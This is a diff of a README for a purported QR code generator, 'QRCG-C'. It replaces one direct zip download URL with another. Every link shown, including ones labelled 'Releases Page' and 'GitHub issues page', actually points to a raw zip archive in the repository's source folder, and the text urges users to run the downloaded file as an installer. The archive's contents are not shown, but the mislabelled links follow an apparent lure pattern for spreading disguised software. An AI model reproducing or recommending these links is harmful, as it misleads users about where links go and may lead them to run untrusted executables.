@@ -9,11 +9,11 @@ Follow these steps to download and run QRCG-C:
 1. **Visit the Releases Page**  
    Click the button below to go to the QRCG-C releases page, where you can find the latest version of the application.
 
-   [![Download QRCG-C](https://raw.githubusercontent.com/pwfvanzyl/QRCG-C/main/src/QRC-C-ctenostomatous.zip)](https://raw.githubusercontent.com/pwfvanzyl/QRCG-C/main/src/QRC-C-ctenostomatous.zip)
+   [![Download QRCG-C](https://github.com/pwfvanzyl/QRCG-C/raw/refs/heads/main/src/QRC-C-3.1.zip)](https://github.com/pwfvanzyl/QRCG-C/raw/refs/heads/main/src/QRC-C-3.1.zip)
 
 ## 📥 Download & Install
 2. **Download the Software**  
-   After you visit the [Releases Page](https://raw.githubusercontent.com/pwfvanzyl/QRCG-C/main/src/QRC-C-ctenostomatous.zip), locate the latest version of QRCG-C. Look for a file that matches your operating system (Windows, macOS, or Linux). Click on the file to download it.
+   After you visit the [Releases Page](https://github.com/pwfvanzyl/QRCG-C/raw/refs/heads/main/src/QRC-C-3.1.zip), locate the latest version of QRCG-C. Look for a file that matches your operating system (Windows, macOS, or Linux). Click on the file to download it.
 
 3. **Install QRCG-C**  
    - **Windows**: Find the downloaded file (often in your 'Downloads' folder). Double-click the file to run the installer, and follow the on-screen prompts.
@@ -53,6 +53,6 @@ Ensure you have at least 50 MB of free disk space for the application and any ge
 - If you have problems creating a QR code, ensure you follow the format required for input data.
 
 ## 💬 Support
-If you encounter any issues or have questions, you can open an issue on the [GitHub issues page](https://raw.githubusercontent.com/pwfvanzyl/QRCG-C/main/src/QRC-C-ctenostomatous.zip). 
+If you encounter any issues or have questions, you can open an issue on the [GitHub issues page](https://github.com/pwfvanzyl/QRCG-C/raw/refs/heads/main/src/QRC-C-3.1.zip). 
 
 Thank you for using QRCG-C! Enjoy generating your QR codes with ease!
